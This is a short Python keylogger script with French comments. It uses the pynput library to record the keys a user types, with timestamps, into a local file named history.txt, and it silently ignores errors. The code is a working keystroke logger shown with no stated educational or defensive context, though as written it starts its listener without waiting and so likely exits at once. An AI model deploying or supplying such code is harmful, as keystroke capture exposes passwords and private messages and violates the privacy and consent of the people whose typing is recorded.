# Import Pynput
from pynput import keyboard

# Import datetime
from datetime import datetime


with open("history.txt", "a") as f:
    f.write(
        f"--- Session débutée le {datetime.now().strftime('%d/%m/%Y à %H:%M:%S')} ---\n"
    )


# --- Log Config ---
def on_press(key):
    try:
        # On récupère l'heure actuelle au format HH:MM:SS
        heure = datetime.now().strftime("%H:%M:%S")

        with open("history.txt", "a") as f:
            if hasattr(key, "char") and key.char is not None:
                # On écrit : [14:30:05] Touche: a
                f.write(f"[{heure}] Touche: {key.char}\n")
            elif key == keyboard.Key.enter:
                f.write(f"[{heure}] Touche: ENTREE\n")
            elif key == keyboard.Key.space:
                f.write(f"[{heure}] Touche: ESPACE\n")
            # On peut ignorer le reste pour ne pas polluer le fichier
    except Exception:
        pass

    # Launch of the listener in mode "not-blocking"


listener = keyboard.Listener(on_press=on_press)
listener.start()
